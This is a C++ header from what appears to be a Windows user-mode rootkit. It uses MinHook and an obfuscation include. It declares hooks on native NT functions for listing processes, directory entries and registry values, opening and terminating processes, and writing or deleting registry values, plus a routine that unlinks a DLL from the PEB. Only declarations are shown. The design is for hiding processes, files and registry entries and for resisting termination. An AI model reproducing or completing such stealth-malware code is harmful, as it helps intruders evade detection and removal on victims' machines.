#pragma once

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <Psapi.h>
#include <algorithm>
#include <string>
#include <cwctype>
#include "MinHook.h"
#include "pebstruct.h"
#include "obfuscate.h"

#include "config.h"

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034)
#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022)

typedef struct _MY_SYSTEM_PROCESS_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE ProcessId;
    HANDLE InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, * PMY_SYSTEM_PROCESS_INFORMATION;

typedef enum _NT_KEY_INFORMATION_CLASS
{
    KeyBasicInformation,
    KeyNodeInformation,
    KeyFullInformation,
    KeyNameInformation
} NT_KEY_INFORMATION_CLASS;

typedef struct _NT_KEY_VALUE_BASIC_INFORMATION
{
    ULONG TitleIndex;
    ULONG Type;
    ULONG NameLength;
    WCHAR Name[1];
} NT_KEY_VALUE_BASIC_INFORMATION, * PNT_KEY_VALUE_BASIC_INFORMATION;

typedef enum _NT_KEY_VALUE_INFORMATION_CLASS
{
    KeyValueBasicInformation,
    KeyValueFullInformation,
    KeyValuePartialInformation
} NT_KEY_VALUE_INFORMATION_CLASS;

typedef struct _NT_KEY_VALUE_FULL_INFORMATION
{
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataOffset;
    ULONG DataLength;
    ULONG NameLength;
    WCHAR Name[1];
} NT_KEY_VALUE_FULL_INFORMATION, * PNT_KEY_VALUE_FULL_INFORMATION;

typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

typedef NTSTATUS(WINAPI* pNtTerminateProcess)(
    HANDLE hProcess,
    UINT code);

typedef NTSTATUS(WINAPI* pNtEnumerateValueKey)(
    HANDLE key,
    ULONG index,
    NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass,
    LPVOID keyValueInformation,
    ULONG keyValueInformationLength,
    PULONG resultLength);

typedef NTSTATUS(WINAPI* pNtQueryValueKey)(
    HANDLE KeyHandle,
    PUNICODE_STRING ValueName,
    NT_KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    PVOID KeyValueInformation,
    ULONG Length,
    PULONG ResultLength);

typedef NTSTATUS(WINAPI* pNtOpenFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG ShareAccess,
    ULONG OpenOptions);

typedef NTSTATUS(WINAPI* pNtSetValueKey)(
    HANDLE KeyHandle,
    PUNICODE_STRING ValueName,
    ULONG TitleIndex,
    ULONG Type,
    PVOID Data,
    ULONG DataSize);

typedef NTSTATUS(WINAPI* pNtDeleteValueKey)(
    HANDLE KeyHandle,
    PUNICODE_STRING ValueName);

typedef NTSTATUS(WINAPI* pNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId);

typedef NTSTATUS(WINAPI* pNtQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan);

// typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(
//     HANDLE ProcessHandle,
//     PROCESSINFOCLASS ProcessInformationClass,
//     PVOID ProcessInformation,
//     ULONG ProcessInformationLength,
//     PULONG ReturnLength);

mPPEB GetPeb(VOID);
VOID RemoveEntryList(LIST_ENTRY*);
BOOL RemoveDllFromPebW(LPCWSTR);

DWORD GetPPID(DWORD);
int GetProcessName(DWORD, char*, DWORD);
bool IsExplorerProcess(void);
PWCHAR KeyValueInformationGetName(LPVOID, NT_KEY_VALUE_INFORMATION_CLASS);
bool CheckExistsA(std::string, std::string, bool);
bool CheckExistsW(std::wstring, std::wstring, bool);

NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE, UINT);
NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE, ULONG, NT_KEY_VALUE_INFORMATION_CLASS, LPVOID, ULONG, PULONG resultLength);
NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE, PUNICODE_STRING, NT_KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);
NTSTATUS WINAPI HookedNtOpenFile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
NTSTATUS WINAPI HookedNtSetValueKey(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
NTSTATUS WINAPI HookedNtDeleteValueKey(HANDLE, PUNICODE_STRING);
NTSTATUS WINAPI HookedNtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
NTSTATUS WINAPI HookedNtQueryDirectoryFile(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN);
// NTSTATUS WINAPI HookedNtQueryInformationProcess(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

extern pNtQuerySystemInformation OriginalNtQuerySystemInformation;
extern pNtTerminateProcess OriginalNtTerminateProcess;
extern pNtEnumerateValueKey OriginalNtEnumerateValueKey;
extern pNtQueryValueKey OriginalNtQueryValueKey;
extern pNtOpenFile OriginalNtOpenFile;
extern pNtSetValueKey OriginalNtSetValueKey;
extern pNtDeleteValueKey OriginalNtDeleteValueKey;
extern pNtOpenProcess OriginalNtOpenProcess;
extern pNtQueryDirectoryFile OriginalNtQueryDirectoryFile;
// extern pNtQueryInformationProcess OriginalNtQueryInformationProcess;